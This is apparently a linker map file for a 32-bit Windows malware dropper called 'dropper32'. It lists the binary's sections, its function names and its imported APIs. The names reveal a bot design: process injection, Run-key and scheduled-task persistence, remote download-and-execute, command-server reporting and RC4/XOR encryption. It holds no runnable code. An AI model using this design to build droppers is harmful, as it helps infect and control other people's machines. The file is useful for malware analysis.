 dropper32

 Timestamp is 51df18d2 (Fri Jul 12 00:42:58 2013)

 Preferred load address is 00400000

 Start         Length     Name                   Class
 0001:00000000 000049acH .text                   CODE
 0002:00000000 000001f8H .idata$5                DATA
 0002:000001f8 00002832H .rdata                  DATA
 0002:00002a2c 000000b4H .idata$2                DATA
 0002:00002ae0 00000014H .idata$3                DATA
 0002:00002af4 000001f8H .idata$4                DATA
 0002:00002cec 0000082eH .idata$6                DATA
 0002:00003520 0000010dH .edata                  DATA
 0003:00000000 000006a0H .data                   DATA
 0003:000006a0 00001fc8H .bss                    DATA

  Address         Publics by Value              Rva+Base       Lib:Object

 0000:00000000       ___safe_se_handler_count   00000000     <absolute>
 0000:00000000       ___safe_se_handler_table   00000000     <absolute>
 0001:00000000       ?CfgsCheckSection@@YGEPAU_CFGI_INI@@PADK@Z 00401000 f   cfgini.obj
 0001:00000042       ?CfgsCheckVariable@@YGEPAU_CFGI_INI@@PADK@Z 00401042 f   cfgini.obj
 0001:000000c6       ?CfgsIniFromMem@@YGPAU_CFGI_INI@@PAD@Z 004010c6 f   cfgini.obj
 0001:0000014d       ?CfgsIniToMem@@YGPAXPAU_CFGI_INI@@PAK@Z 0040114d f   cfgini.obj
 0001:00000231       ?CfgsFindSection@@YGPAU_CFGI_SEC@@PAU_CFGI_INI@@PAD@Z 00401231 f   cfgini.obj
 0001:00000276       ?CfgsFindVariable@@YGPAU_CFGI_VAR@@PAU_CFGI_SEC@@PAD@Z 00401276 f   cfgini.obj
 0001:000002b7       ?CfgsWriteString@@YGPAXPAXPAKPAD22@Z 004012b7 f   cfgini.obj
 0001:000003a7       ?CfgsReadString@@YGKPAXKPAD1PAPAD@Z 004013a7 f   cfgini.obj
 0001:0000040d       ?CfgfWriteString@@YGEPAD0000@Z 0040140d f   cfgini.obj
 0001:000004bc       ?CfgfReadStringM@@YGKPAD00PAPAD0@Z 004014bc f   cfgini.obj
 0001:0000052e       ?CfgfReadString@@YGKPAD0000K0@Z 0040152e f   cfgini.obj
 0001:00000586       ?ReadConfig@Config@@YGXXZ  00401586 f   config.obj
 0001:000005c7       ?WriteString@Config@@YGEPAD00@Z 004015c7 f   config.obj
 0001:000005e2       ?ReadString@Config@@YGEPAD00K@Z 004015e2 f   config.obj
 0001:00000632       ?ReadInt@Config@@YGKPAD0@Z 00401632 f   config.obj
 0001:00000669       ?WriteInt@Config@@YGEPAD0K@Z 00401669 f   config.obj
 0001:000006ab       ?RegWriteString@Config@@YGEPAD0@Z 004016ab f   config.obj
 0001:0000074c       ?RegReadString@Config@@YGEPAD0K@Z 0040174c f   config.obj
 0001:000007ef       ?GetMachineGuid@Drop@@YGPADXZ 004017ef f   dropper.obj
 0001:00000856       ?GetBotID@Drop@@YGPADXZ    00401856 f   dropper.obj
 0001:000009c9       ?CreateInjectStartThread@Drop@@YGXXZ 004019c9 f   dropper.obj
 0001:000009e8       ?InjectStartThread@Drop@@YGKPAX@Z 004019e8 f   dropper.obj
 0001:00000a82       ?Entry@@YGHPAUHINSTANCE__@@KPAX@Z 00401a82 f   dropper.obj
 0001:00000c6d       ?CheckProcessName@Inject@@YGEPAX@Z 00401c6d f   inject.obj
 0001:00000d6c       ?InjectNormalRoutine@@YGXPAX@Z 00401d6c f   inject.obj
 0001:00000d87       ?InjectApcRoutine@@YGXPAX00@Z 00401d87 f   inject.obj
 0001:00000d9a       ?NewZwResumeThread@@YGJPAXPAK@Z 00401d9a f   inject.obj
 0001:00000df3       ?SetCreateProcessHooks@Inject@@YGXXZ 00401df3 f   inject.obj
 0001:00000e56       ?InjectRoutine@Inject@@YGXPAXE@Z 00401e56 f   inject.obj
 0001:00000ee8       ?CopyImageToProcess@Inject@@YGEPAX0KPA_K@Z 00401ee8 f   inject.obj
 0001:00001021       ?InjectImageToProcess@Inject@@YGEPAX0K0@Z 00402021 f   inject.obj
 0001:0000116d       ?InjectProcess@Inject@@YGEKPAX@Z 0040216d f   inject.obj
 0001:00001267       ?InjectProcessByName@Inject@@YGEPAD@Z 00402267 f   inject.obj
 0001:000012b2       ?LoadInjectModules@Modules@@YGXPAD@Z 004022b2 f   modules.obj
 0001:00001330       ?LoadModulesToProcess@Modules@@YGXPAD@Z 00402330 f   modules.obj
 0001:0000136e       ?InjectorAdd@Modules@@YGEPAD0@Z 0040236e f   modules.obj
 0001:00001407       ?GetModuleByName@Modules@@YGPAU_DCT_MODULE@1@PAD@Z 00402407 f   modules.obj
 0001:00001463       ?GetModuleByHandle@Modules@@YGPAU_DCT_MODULE@1@PAX@Z 00402463 f   modules.obj
 0001:0000148e       ?WriteModuleAndLoad@Modules@@YGEPAXKPADK11K1@Z 0040248e f   modules.obj
 0001:00001599       ?ModuleLoad@Modules@@YGPAXPAD@Z 00402599 f   modules.obj
 0001:000017f3       ?RegisterDelayedModuleLoad@Modules@@YGEPAD0@Z 004027f3 f   modules.obj
 0001:00001884       ?ModuleLoadNotify@Modules@@YGXPADPAX@Z 00402884 f   modules.obj
 0001:000018cd       ?ModulePreprocess@Modules@@YGXPAXPAD1@Z 004028cd f   modules.obj
 0001:00001994       ?PeImageNtHeader@PeLdr@@YGPAU_IMAGE_NT_HEADERS@@PAX@Z 00402994 f   peldr.obj
 0001:000019ae       ?PeSearchSection@PeLdr@@YGPAU_IMAGE_SECTION_HEADER@@PAXPAD@Z 004029ae f   peldr.obj
 0001:000019f6       ?PeImageDirectoryEntryToData@PeLdr@@YGPAXPAXEKPAKE@Z 004029f6 f   peldr.obj
 0001:00001a5a       ?PeGetNtdllImageBase@PeLdr@@YGPAXXZ 00402a5a f   peldr.obj
 0001:00001a88       ?PeGetProcAddress@PeLdr@@YGPAXPAXPADE@Z 00402a88 f   peldr.obj
 0001:00001aed       ?PeProcessImport@PeLdr@@YGEPAXE@Z 00402aed f   peldr.obj
 0001:00001c04       ?PeProcessRelocationBlock@PeLdr@@YGPAU_IMAGE_BASE_RELOCATION@@KKPAG_K@Z 00402c04 f   peldr.obj
 0001:00001d5d       ?PeProcessRelocs@PeLdr@@YGEPAX_K@Z 00402d5d f   peldr.obj
 0001:00001dc9       ?FreeSpaceInHeader@PeLdr@@YGKPAXPAU_IMAGE_NT_HEADERS@@@Z 00402dc9 f   peldr.obj
 0001:00001de9       ?GetVirtualyLastSectionHeader@PeLdr@@YGPAU_IMAGE_SECTION_HEADER@@PAU_IMAGE_NT_HEADERS@@@Z 00402de9 f   peldr.obj
 0001:00001dfb       ?GetPhysicalyLastSectionHeader@PeLdr@@YGPAU_IMAGE_SECTION_HEADER@@PAU_IMAGE_NT_HEADERS@@@Z 00402dfb f   peldr.obj
 0001:00001e2c       ?InsertSection@PeLdr@@YGEPADPAXK1KPAPAXPAKE@Z 00402e2c f   peldr.obj
 0001:00002001       ?PeGetImageBase@PeLdr@@YG_KPAX@Z 00403001 f   peldr.obj
 0001:00002038       ?LoadPEImage@PeLdr@@YGPAXPAXP6GX0PAD1@Z11@Z 00403038 f   peldr.obj
 0001:00002152       ?UpdateMain@Protect@@YGEPAXK@Z 00403152 f   protect.obj
 0001:000021ec       ?ProtectThread@Protect@@YGKPAX@Z 004031ec f   protect.obj
 0001:00002270       ?StartProtect@Protect@@YGXXZ 00403270 f   protect.obj
 0001:0000234c       ?GetFileNameFromGuid@Protect@@YGXPAD0@Z 0040334c f   protect.obj
 0001:000023af       ?GetStorageFolderPath@Protect@@YGXPAD@Z 004033af f   protect.obj
 0001:000023c6       ?GetNewPath@Protect@@YGXPAD0@Z 004033c6 f   protect.obj
 0001:00002418       ?WriteFileToNewPath@Protect@@YGEPAD0@Z 00403418 f   protect.obj
 0001:00002490       ?AddKeyToRun@Protect@@YGEPAD@Z 00403490 f   protect.obj
 0001:00002580       ?InsertSectionConfig@SecCfg@@YGEPAU_SECTION_CONFIG@1@PAXKPAPAXPAKE@Z 00403580 f   seccfg.obj
 0001:00002606       ?GetSectionConfig@SecCfg@@YGEPAU_SECTION_CONFIG@1@PAX@Z 00403606 f   seccfg.obj
 0001:00002676       ?LoadImageSections@SecCfg@@YGPAXPAXPAK@Z 00403676 f   seccfg.obj
 0001:00002716       ?ConvertImageToImage@SecCfg@@YGEPAXPAU_SECTION_CONFIG@1@PAPAXPAKE@Z 00403716 f   seccfg.obj
 0001:0000287e       ?GetImageFromImage@SecCfg@@YGEPAXPAPAXPAKE@Z 0040387e f   seccfg.obj
 0001:000028c8       ?DownloadRunExeUrl@@YGEKPAD0@Z 004038c8 f   server.obj
 0001:00002973       ?DownloadRunExeId@@YGEKPADK@Z 00403973 f   server.obj
 0001:000029d3       ?DownloadRunModId@@YGEKPADK0K00K0@Z 004039d3 f   server.obj
 0001:00002a55       ?DownloadUpdateMain@@YGEKPADKK@Z 00403a55 f   server.obj
 0001:00002aea       ?WriteConfigString@@YGEKPAD000@Z 00403aea f   server.obj
 0001:00002aff       ?SendLogs@@YGKKPAD@Z       00403aff f   server.obj
 0001:00002b42       ?SendLogsToServer@Server@@YGXXZ 00403b42 f   server.obj
 0001:00002baa       ?SendServerAnswer@Server@@YGXKPADEK@Z 00403baa f   server.obj
 0001:00002c18       ?DownloadFileById@Server@@YGPAXKPADPAK@Z 00403c18 f   server.obj
 0001:00002c5f       ?SendRequest@Server@@YGPADPADK0KEPAKPAE@Z 00403c5f f   server.obj
 0001:00002dfd       ?ProcessServerAnswer@Server@@YGKPAD@Z 00403dfd f   server.obj
 0001:00002f22       ?SendReport@Server@@YGEPAD@Z 00403f22 f   server.obj
 0001:00002fe5       ?ServerLoopThread@Server@@YGKPAX@Z 00403fe5 f   server.obj
 0001:000030b8       ?WriteLogMessage@Utils@@YGXPAD@Z 004040b8 f   utils.obj
 0001:0000310d       ?ReadLogsFromFile@Utils@@YGPAXPAK@Z 0040410d f   utils.obj
 0001:0000316b       ?DbgMsg@@YAXPADZZ          0040416b f   utils.obj
 0001:0000320d       _malloc                    0040420d f   utils.obj
 0001:00003224       _free                      00404224 f   utils.obj
 0001:00003241       _realloc                   00404241 f   utils.obj
 0001:0000325b       ?xwcsicmp@@YGHPA_W0@Z      0040425b f   utils.obj
 0001:000032a9       ?xstrcmp@@YGHPAD0@Z        004042a9 f   utils.obj
 0001:000032ca       ?UtiStrNCpyM@@YGPADPADK@Z  004042ca f   utils.obj
 0001:000032f2       ?UtiStrNCpy@@YGXPAD0K@Z    004042f2 f   utils.obj
 0001:0000330b       ?xstrlen@@YGIPAD@Z         0040430b f   utils.obj
 0001:00003320       ?xRtlInitAnsiString@@YGXPAU_STRING@@PAD@Z 00404320 f   utils.obj
 0001:0000333d       ?PrintSystemTime@Utils@@YGXPADK@Z 0040433d f   utils.obj
 0001:000033b4       ?GetRandomString@Utils@@YGXPADK@Z 004043b4 f   utils.obj
 0001:000033e8       ?RegReadValue@Utils@@YGJPAUHKEY__@@PAD1KPAXK@Z 004043e8 f   utils.obj
 0001:00003455       ?_getValueAsBinaryEx@Utils@@YGKPAUHKEY__@@QAD1PAKPAPAX@Z 00404455 f   utils.obj
 0001:000034fa       ?ThreadCreate@Utils@@YGKPAX0PAPAXK@Z 004044fa f   utils.obj
 0001:0000355e       ?GetProcessIdByName@Utils@@YGKPADPAKK@Z 0040455e f   utils.obj
 0001:000035fe       ?FileLock@Utils@@YGPAXPADKK@Z 004045fe f   utils.obj
 0001:00003656       ?FileUnlock@Utils@@YGXPAX@Z 00404656 f   utils.obj
 0001:0000368b       ?FileHandleWrite@Utils@@YGEPAX0KK@Z 0040468b f   utils.obj
 0001:000036c6       ?FileWrite@Utils@@YGEPADKPAXKK@Z 004046c6 f   utils.obj
 0001:0000372c       ?FileHandleRead@Utils@@YGPAXPAXPAK@Z 0040472c f   utils.obj
 0001:000037a0       ?FileRead@Utils@@YGPAXPADPAK@Z 004047a0 f   utils.obj
 0001:000037ff       ?IsWow64@Utils@@YGHPAX@Z   004047ff f   utils.obj
 0001:00003832       ?ReplaceIAT@Utils@@YGEPAD0PAXPAUHINSTANCE__@@@Z 00404832 f   utils.obj
 0001:00003951       ?GetProcessIntegrityLevel@Utils@@YGKXZ 00404951 f   utils.obj
 0001:000039e8       ?CheckAdmin@Utils@@YGHXZ   004049e8 f   utils.obj
 0001:00003a42       ?CheckUAC@Utils@@YGHXZ     00404a42 f   utils.obj
 0001:00003a96       ?UtiCryptRc4@Utils@@YGXPADKPAX1K@Z 00404a96 f   utils.obj
 0001:00003b70       ?UtiCryptRc4M@Utils@@YGPAXPADKPAXK@Z 00404b70 f   utils.obj
 0001:00003b9c       ?StringTokenBreak@Utils@@YGEPAPADPAD0@Z 00404b9c f   utils.obj
 0001:00003c04       ?GetWindowsVersion@Utils@@YGXPADK@Z 00404c04 f   utils.obj
 0001:00003daa       ?GetParrentProcessName@Utils@@YGXPADK@Z 00404daa f   utils.obj
 0001:00003e0a       ?SetPrivilege@Utils@@YGHPADH@Z 00404e0a f   utils.obj
 0001:00003e7d       ?CheckMutex@Utils@@YGEKPAD@Z 00404e7d f   utils.obj
 0001:00003ecc       ?CreateCheckMutex@Utils@@YGPAXKPAD@Z 00404ecc f   utils.obj
 0001:00003f2c       ?RestartModuleShellExec@Utils@@YGXPAD@Z 00404f2c f   utils.obj
 0001:00004013       ?WriteFileAndExecute@Utils@@YGEPAXK@Z 00405013 f   utils.obj
 0001:0000408b       ?DeleteFileReboot@Utils@@YGXPAD@Z 0040508b f   utils.obj
 0001:00004122       ?WinetGetUserAgentStr@@YGXPADK@Z 00405122 f   utils.obj
 0001:00004183       ?ExecExportProcedure@Utils@@YGKPAXPAD1@Z 00405183 f   utils.obj
 0001:00004314       ?WinetLoadUrl@@YGPAXPAU_WINET_LOADURL@@@Z 00405314 f   utils.obj
 0001:0000456f       ?WinetLoadUrlThread@@YGPAXPAU_WINET_LOADURL@@@Z 0040556f f   utils.obj
 0001:00004599       ?WinetLoadUrlWait@@YGPAXPAU_WINET_LOADURL@@K@Z 00405599 f   utils.obj
 0001:000045b1       ?crc32Hash@Utils@@YGKPBXK@Z 004055b1 f   utils.obj
 0001:0000461c       ?XorCrypt@Utils@@YGXPAXKK@Z 0040561c f   utils.obj
 0001:00004644       ?getTEB64@x64Utils@@YGPAU_TEB64@WOW64@@XZ 00405644 f   x64utils.obj
 0001:00004682       ?getNTDLL64@x64Utils@@YGKXZ 00405682 f   x64utils.obj
 0001:000046c8       ?X64Call@x64Utils@@YA_KKHZZ 004056c8 f   x64utils.obj
 0001:000047ea       ?x64RtlCreateUserThread@x64Utils@@YGJPAX_K1PAPAX@Z 004057ea f   x64utils.obj
 0001:00004856       ?x64NtAllocateVirtualMemory@x64Utils@@YGJPAXPA_K_KKK@Z 00405856 f   x64utils.obj
 0001:000048b6       ?x64NtWriteVirtualMemory@x64Utils@@YGJPAX_K11@Z 004058b6 f   x64utils.obj
 0001:00004910       ?x64NtQueueApcThread@x64Utils@@YGJPAX_K1@Z 00405910 f   x64utils.obj
 0001:00004968       _memset                    00405968 f   ntdll:ntdll.dll
 0001:0000496e       _memcpy                    0040596e f   ntdll:ntdll.dll
 0001:00004974       __chkstk                   00405974 f   ntdll:ntdll.dll
 0001:00004980       __alloca_probe_16          00405980 f   msvcrt:alloca16.obj
 0001:00004996       __alloca_probe_8           00405996     msvcrt:alloca16.obj
 0002:00000000       __imp__GetSidSubAuthority@8 00406000     advapi32:ADVAPI32.dll
 0002:00000004       __imp__AdjustTokenPrivileges@24 00406004     advapi32:ADVAPI32.dll
 0002:00000008       __imp__CheckTokenMembership@12 00406008     advapi32:ADVAPI32.dll
 0002:0000000c       __imp__FreeSid@4           0040600c     advapi32:ADVAPI32.dll
 0002:00000010       __imp__AllocateAndInitializeSid@44 00406010     advapi32:ADVAPI32.dll
 0002:00000014       __imp__RegOpenKeyExA@20    00406014     advapi32:ADVAPI32.dll
 0002:00000018       __imp__LookupPrivilegeValueA@12 00406018     advapi32:ADVAPI32.dll
 0002:0000001c       __imp__GetTokenInformation@20 0040601c     advapi32:ADVAPI32.dll
 0002:00000020       __imp__GetSidSubAuthorityCount@4 00406020     advapi32:ADVAPI32.dll
 0002:00000024       __imp__OpenProcessToken@12 00406024     advapi32:ADVAPI32.dll
 0002:00000028       __imp__RegCloseKey@4       00406028     advapi32:ADVAPI32.dll
 0002:0000002c       __imp__RegCreateKeyExA@36  0040602c     advapi32:ADVAPI32.dll
 0002:00000030       __imp__RegQueryValueExA@24 00406030     advapi32:ADVAPI32.dll
 0002:00000034       __imp__RegSetValueExA@24   00406034     advapi32:ADVAPI32.dll
 0002:00000038       \177ADVAPI32_NULL_THUNK_DATA 00406038     advapi32:ADVAPI32.dll
 0002:0000003c       __imp__CreateThread@24     0040603c     kernel32:KERNEL32.dll
 0002:00000040       __imp__LocalFree@4         00406040     kernel32:KERNEL32.dll
 0002:00000044       __imp__GetVersionExA@4     00406044     kernel32:KERNEL32.dll
 0002:00000048       __imp__CreateToolhelp32Snapshot@8 00406048     kernel32:KERNEL32.dll
 0002:0000004c       __imp__lstrlenA@4          0040604c     kernel32:KERNEL32.dll
 0002:00000050       __imp__CreateFileA@28      00406050     kernel32:KERNEL32.dll
 0002:00000054       __imp__GetFileSize@8       00406054     kernel32:KERNEL32.dll
 0002:00000058       __imp__SetFilePointer@16   00406058     kernel32:KERNEL32.dll
 0002:0000005c       __imp__VirtualQuery@12     0040605c     kernel32:KERNEL32.dll
 0002:00000060       __imp__SetEndOfFile@4      00406060     kernel32:KERNEL32.dll
 0002:00000064       __imp__WaitForSingleObject@8 00406064     kernel32:KERNEL32.dll
 0002:00000068       __imp__GetTickCount@0      00406068     kernel32:KERNEL32.dll
 0002:0000006c       __imp__VirtualFree@12      0040606c     kernel32:KERNEL32.dll
 0002:00000070       __imp__WriteFile@20        00406070     kernel32:KERNEL32.dll
 0002:00000074       __imp__Sleep@4             00406074     kernel32:KERNEL32.dll
 0002:00000078       __imp__ReadFile@20         00406078     kernel32:KERNEL32.dll
 0002:0000007c       __imp__GetLastError@0      0040607c     kernel32:KERNEL32.dll
 0002:00000080       __imp__GetProcAddress@8    00406080     kernel32:KERNEL32.dll
 0002:00000084       __imp__GetTempFileNameA@16 00406084     kernel32:KERNEL32.dll
 0002:00000088       __imp__LoadLibraryA@4      00406088     kernel32:KERNEL32.dll
 0002:0000008c       __imp__GetModuleHandleA@4  0040608c     kernel32:KERNEL32.dll
 0002:00000090       __imp__VirtualProtect@16   00406090     kernel32:KERNEL32.dll
 0002:00000094       __imp__CloseHandle@4       00406094     kernel32:KERNEL32.dll
 0002:00000098       __imp__GetCurrentProcessId@0 00406098     kernel32:KERNEL32.dll
 0002:0000009c       __imp__GetTempPathA@8      0040609c     kernel32:KERNEL32.dll
 0002:000000a0       __imp__WriteProcessMemory@20 004060a0     kernel32:KERNEL32.dll
 0002:000000a4       __imp__DeleteFileA@4       004060a4     kernel32:KERNEL32.dll
 0002:000000a8       __imp__ExitProcess@4       004060a8     kernel32:KERNEL32.dll
 0002:000000ac       __imp__GetComputerNameA@8  004060ac     kernel32:KERNEL32.dll
 0002:000000b0       __imp__lstrcpynA@12        004060b0     kernel32:KERNEL32.dll
 0002:000000b4       __imp__GetVersionExW@4     004060b4     kernel32:KERNEL32.dll
 0002:000000b8       __imp__lstrcatA@8          004060b8     kernel32:KERNEL32.dll
 0002:000000bc       __imp__lstrcmpiA@8         004060bc     kernel32:KERNEL32.dll
 0002:000000c0       __imp__GetModuleFileNameA@12 004060c0     kernel32:KERNEL32.dll
 0002:000000c4       __imp__lstrcpyA@8          004060c4     kernel32:KERNEL32.dll
 0002:000000c8       __imp__CreateRemoteThread@28 004060c8     kernel32:KERNEL32.dll
 0002:000000cc       __imp__OpenProcess@12      004060cc     kernel32:KERNEL32.dll
 0002:000000d0       __imp__VirtualAllocEx@20   004060d0     kernel32:KERNEL32.dll
 0002:000000d4       __imp__HeapReAlloc@16      004060d4     kernel32:KERNEL32.dll
 0002:000000d8       __imp__HeapAlloc@12        004060d8     kernel32:KERNEL32.dll
 0002:000000dc       __imp__HeapFree@12         004060dc     kernel32:KERNEL32.dll
 0002:000000e0       __imp__GetProcessHeap@0    004060e0     kernel32:KERNEL32.dll
 0002:000000e4       __imp__OutputDebugStringA@4 004060e4     kernel32:KERNEL32.dll
 0002:000000e8       __imp__VirtualAlloc@16     004060e8     kernel32:KERNEL32.dll
 0002:000000ec       __imp__lstrcmpA@8          004060ec     kernel32:KERNEL32.dll
 0002:000000f0       __imp__ExitThread@4        004060f0     kernel32:KERNEL32.dll
 0002:000000f4       __imp__SetLastError@4      004060f4     kernel32:KERNEL32.dll
 0002:000000f8       __imp__WinExec@8           004060f8     kernel32:KERNEL32.dll
 0002:000000fc       __imp__MoveFileExA@12      004060fc     kernel32:KERNEL32.dll
 0002:00000100       __imp__GetCurrentProcess@0 00406100     kernel32:KERNEL32.dll
 0002:00000104       __imp__Process32First@8    00406104     kernel32:KERNEL32.dll
 0002:00000108       __imp__GetTimeFormatA@24   00406108     kernel32:KERNEL32.dll
 0002:0000010c       __imp__UnlockFileEx@20     0040610c     kernel32:KERNEL32.dll
 0002:00000110       __imp__CreateMutexA@12     00406110     kernel32:KERNEL32.dll
 0002:00000114       __imp__GetDateFormatA@24   00406114     kernel32:KERNEL32.dll
 0002:00000118       __imp__FlushInstructionCache@12 00406118     kernel32:KERNEL32.dll
 0002:0000011c       __imp__LockFileEx@24       0040611c     kernel32:KERNEL32.dll
 0002:00000120       __imp__GetLocalTime@4      00406120     kernel32:KERNEL32.dll
 0002:00000124       __imp__OpenMutexA@12       00406124     kernel32:KERNEL32.dll
 0002:00000128       __imp__Process32Next@8     00406128     kernel32:KERNEL32.dll
 0002:0000012c       __imp__LocalAlloc@8        0040612c     kernel32:KERNEL32.dll
 0002:00000130       __imp__GetExitCodeThread@8 00406130     kernel32:KERNEL32.dll
 0002:00000134       __imp__GetSystemInfo@4     00406134     kernel32:KERNEL32.dll
 0002:00000138       \177KERNEL32_NULL_THUNK_DATA 00406138     kernel32:KERNEL32.dll
 0002:0000013c       __imp__GetModuleFileNameExA@16 0040613c     psapi:PSAPI.DLL
 0002:00000140       __imp__GetProcessImageFileNameA@12 00406140     psapi:PSAPI.DLL
 0002:00000144       \177PSAPI_NULL_THUNK_DATA  00406144     psapi:PSAPI.DLL
 0002:00000148       __imp__ShellExecuteExA@4   00406148     shell32:SHELL32.dll
 0002:0000014c       __imp__SHGetFolderPathA@20 0040614c     shell32:SHELL32.dll
 0002:00000150       \177SHELL32_NULL_THUNK_DATA 00406150     shell32:SHELL32.dll
 0002:00000154       __imp__PathCombineA@12     00406154     shlwapi:SHLWAPI.dll
 0002:00000158       __imp__PathFindFileNameA@4 00406158     shlwapi:SHLWAPI.dll
 0002:0000015c       __imp__StrStrIA@8          0040615c     shlwapi:SHLWAPI.dll
 0002:00000160       __imp__UrlGetPartA@20      00406160     shlwapi:SHLWAPI.dll
 0002:00000164       __imp__StrToIntA@4         00406164     shlwapi:SHLWAPI.dll
 0002:00000168       \177SHLWAPI_NULL_THUNK_DATA 00406168     shlwapi:SHLWAPI.dll
 0002:0000016c       __imp__GetSystemMetrics@4  0040616c     user32:USER32.dll
 0002:00000170       __imp__GetForegroundWindow@0 00406170     user32:USER32.dll
 0002:00000174       \177USER32_NULL_THUNK_DATA 00406174     user32:USER32.dll
 0002:00000178       __imp__InternetCrackUrlA@16 00406178     wininet:WININET.dll
 0002:0000017c       __imp__HttpOpenRequestA@32 0040617c     wininet:WININET.dll
 0002:00000180       __imp__HttpSendRequestA@20 00406180     wininet:WININET.dll
 0002:00000184       __imp__InternetOpenA@20    00406184     wininet:WININET.dll
 0002:00000188       __imp__InternetCloseHandle@4 00406188     wininet:WININET.dll
 0002:0000018c       __imp__InternetSetOptionA@16 0040618c     wininet:WININET.dll
 0002:00000190       __imp__InternetReadFile@16 00406190     wininet:WININET.dll
 0002:00000194       __imp__InternetConnectA@32 00406194     wininet:WININET.dll
 0002:00000198       __imp__HttpQueryInfoA@20   00406198     wininet:WININET.dll
 0002:0000019c       \177WININET_NULL_THUNK_DATA 0040619c     wininet:WININET.dll
 0002:000001a0       __imp__strchr              004061a0     ntdll:ntdll.dll
 0002:000001a4       __imp___snprintf           004061a4     ntdll:ntdll.dll
 0002:000001a8       __imp___snwprintf          004061a8     ntdll:ntdll.dll
 0002:000001ac       __imp__memcpy              004061ac     ntdll:ntdll.dll
 0002:000001b0       __imp__memset              004061b0     ntdll:ntdll.dll
 0002:000001b4       __imp__RtlImageNtHeader@4  004061b4     ntdll:ntdll.dll
 0002:000001b8       __imp__RtlExitUserThread@4 004061b8     ntdll:ntdll.dll
 0002:000001bc       __imp__ZwResumeThread@8    004061bc     ntdll:ntdll.dll
 0002:000001c0       __imp__NtQueryInformationThread@20 004061c0     ntdll:ntdll.dll
 0002:000001c4       __imp__NtQueueApcThread@20 004061c4     ntdll:ntdll.dll
 0002:000001c8       __imp__tolower             004061c8     ntdll:ntdll.dll
 0002:000001cc       __imp__isalpha             004061cc     ntdll:ntdll.dll
 0002:000001d0       __imp__sscanf              004061d0     ntdll:ntdll.dll
 0002:000001d4       __imp__NtQueryInformationProcess@20 004061d4     ntdll:ntdll.dll
 0002:000001d8       __imp__strncpy             004061d8     ntdll:ntdll.dll
 0002:000001dc       __imp___vsnprintf          004061dc     ntdll:ntdll.dll
 0002:000001e0       __imp__RtlRandom@4         004061e0     ntdll:ntdll.dll
 0002:000001e4       __imp___stricmp            004061e4     ntdll:ntdll.dll
 0002:000001e8       __imp___chkstk             004061e8     ntdll:ntdll.dll
 0002:000001ec       \177ntdll_NULL_THUNK_DATA  004061ec     ntdll:ntdll.dll
 0002:000001f0       __imp__URLDownloadToFileA@20 004061f0     urlmon:urlmon.dll
 0002:000001f4       \177urlmon_NULL_THUNK_DATA 004061f4     urlmon:urlmon.dll
 0002:000001f8       _LIBID_TaskScheduler       004061f8     taskschd:taskschd_i.obj
 0002:00000208       _IID_ITaskFolderCollection 00406208     taskschd:taskschd_i.obj
 0002:00000218       _IID_ITaskService          00406218     taskschd:taskschd_i.obj
 0002:00000228       _IID_ITaskHandler          00406228     taskschd:taskschd_i.obj
 0002:00000238       _IID_ITaskHandlerStatus    00406238     taskschd:taskschd_i.obj
 0002:00000248       _IID_ITaskVariables        00406248     taskschd:taskschd_i.obj
 0002:00000258       _IID_ITaskNamedValuePair   00406258     taskschd:taskschd_i.obj
 0002:00000268       _IID_ITaskNamedValueCollection 00406268     taskschd:taskschd_i.obj
 0002:00000278       _IID_IRunningTask          00406278     taskschd:taskschd_i.obj
 0002:00000288       _IID_IRunningTaskCollection 00406288     taskschd:taskschd_i.obj
 0002:00000298       _IID_IRegisteredTask       00406298     taskschd:taskschd_i.obj
 0002:000002a8       _IID_ITrigger              004062a8     taskschd:taskschd_i.obj
 0002:000002b8       _IID_IIdleTrigger          004062b8     taskschd:taskschd_i.obj
 0002:000002c8       _IID_ILogonTrigger         004062c8     taskschd:taskschd_i.obj
 0002:000002d8       _IID_ISessionStateChangeTrigger 004062d8     taskschd:taskschd_i.obj
 0002:000002e8       _IID_IEventTrigger         004062e8     taskschd:taskschd_i.obj
 0002:000002f8       _IID_ITimeTrigger          004062f8     taskschd:taskschd_i.obj
 0002:00000308       _IID_IDailyTrigger         00406308     taskschd:taskschd_i.obj
 0002:00000318       _IID_IWeeklyTrigger        00406318     taskschd:taskschd_i.obj
 0002:00000328       _IID_IMonthlyTrigger       00406328     taskschd:taskschd_i.obj
 0002:00000338       _IID_IMonthlyDOWTrigger    00406338     taskschd:taskschd_i.obj
 0002:00000348       _IID_IBootTrigger          00406348     taskschd:taskschd_i.obj
 0002:00000358       _IID_IRegistrationTrigger  00406358     taskschd:taskschd_i.obj
 0002:00000368       _IID_IAction               00406368     taskschd:taskschd_i.obj
 0002:00000378       _IID_IExecAction           00406378     taskschd:taskschd_i.obj
 0002:00000388       _IID_IShowMessageAction    00406388     taskschd:taskschd_i.obj
 0002:00000398       _IID_IComHandlerAction     00406398     taskschd:taskschd_i.obj
 0002:000003a8       _IID_IEmailAction          004063a8     taskschd:taskschd_i.obj
 0002:000003b8       _IID_ITriggerCollection    004063b8     taskschd:taskschd_i.obj
 0002:000003c8       _IID_IActionCollection     004063c8     taskschd:taskschd_i.obj
 0002:000003d8       _IID_IPrincipal            004063d8     taskschd:taskschd_i.obj
 0002:000003e8       _IID_IRegistrationInfo     004063e8     taskschd:taskschd_i.obj
 0002:000003f8       _IID_ITaskDefinition       004063f8     taskschd:taskschd_i.obj
 0002:00000408       _IID_ITaskSettings         00406408     taskschd:taskschd_i.obj
 0002:00000418       _IID_ITaskSettings2        00406418     taskschd:taskschd_i.obj
 0002:00000428       _CLSID_TaskScheduler       00406428     taskschd:taskschd_i.obj
 0002:00000438       _CLSID_TaskHandlerPS       00406438     taskschd:taskschd_i.obj
 0002:00000448       _CLSID_TaskHandlerStatusPS 00406448     taskschd:taskschd_i.obj
 0002:00000458       _IID_IRegisteredTaskCollection 00406458     taskschd:taskschd_i.obj
 0002:00000468       _IID_ITaskFolder           00406468     taskschd:taskschd_i.obj
 0002:00000478       _IID_IIdleSettings         00406478     taskschd:taskschd_i.obj
 0002:00000488       _IID_INetworkSettings      00406488     taskschd:taskschd_i.obj
 0002:00000498       _IID_IRepetitionPattern    00406498     taskschd:taskschd_i.obj
 0002:000004a8       _IID_IPrincipal2           004064a8     taskschd:taskschd_i.obj
 0002:00002a2c       __IMPORT_DESCRIPTOR_ntdll  00408a2c     ntdll:ntdll.dll
 0002:00002a40       __IMPORT_DESCRIPTOR_KERNEL32 00408a40     kernel32:KERNEL32.dll
 0002:00002a54       __IMPORT_DESCRIPTOR_USER32 00408a54     user32:USER32.dll
 0002:00002a68       __IMPORT_DESCRIPTOR_ADVAPI32 00408a68     advapi32:ADVAPI32.dll
